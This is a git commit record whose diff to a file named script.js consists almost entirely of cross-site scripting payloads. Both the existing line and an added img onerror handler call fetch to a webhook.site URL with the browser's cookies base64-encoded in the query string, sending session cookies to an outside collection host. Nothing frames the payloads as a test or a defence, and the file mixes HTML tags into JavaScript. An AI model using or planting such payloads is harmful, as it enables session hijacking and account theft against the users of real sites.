7f4f2bbeaa315ead82003296714085b657c4422b
SmallliDinosaur <ste700789@gmail.com>
2025-04-06 23:47:57 +0800

    first

--- script.js
+++ script.js
@@ -1,1 +1,4 @@
+<script>
 fetch("https://webhook.site/46c24974-7a95-4103-9340-b43bf064332b?"+window.btoa(cookie))
+<img src=1234 onerror=\"fetch('https://webhook.site/46c24974-7a95-4103-9340-b43bf064332b?'+window.btoa(document.cookie))\">
+</script>
